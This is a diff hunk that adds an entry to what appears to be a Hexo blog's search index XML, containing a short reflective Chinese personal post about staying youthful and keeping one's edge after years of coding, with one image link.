   </entry>
   <entry>
@@ -1573,6 +1600,19 @@
       </categories>
       <tags>
         <tag>Win</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>愿你编码半生，归来仍是少年</title>
+    <url>/2019/10/21/%E6%84%BF%E4%BD%A0%E7%BC%96%E7%A0%81%E5%8D%8A%E7%94%9F%EF%BC%8C%E5%BD%92%E6%9D%A5%E4%BB%8D%E6%98%AF%E5%B0%91%E5%B9%B4/</url>
+    <content><![CDATA[<h4 id="Hello-World-不巧，我也在等你。"><a href="#Hello-World-不巧，我也在等你。" class="headerlink" title="Hello,World.不巧，我也在等你。"></a>Hello,World.不巧，我也在等你。</h4><p>​      有人说自己被社会磨平了棱角，泯灭了心性，受生活所迫，“都说是为生活所迫，生活缺从来没有被抓过；都说被社会磨去棱角，社会之恶至今无法逃脱”，我们都有权利选择自己想成为的人，并不是由社会说了算，我们都曾年少，我们都曾有棱角，社会的熔炉却在不断的炼化我们，到底是磨平了棱角，还是磨成了钢刀，就让时间来见证吧！</p>
+<p>​      常年混迹于各大网络社区，也曾愤青，如今独爱云淡风轻，只愿在滚滚红尘中揽得风花雪月独醉。</p>
+<h4 id="感谢你的到来。"><a href="#感谢你的到来。" class="headerlink" title="感谢你的到来。"></a>感谢你的到来。</h4><span id="more"></span>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/blog/images/8.jpg" alt="8"></p>
+]]></content>
+      <tags>
+        <tag>随心</tag>
       </tags>
   </entry>
   <entry>
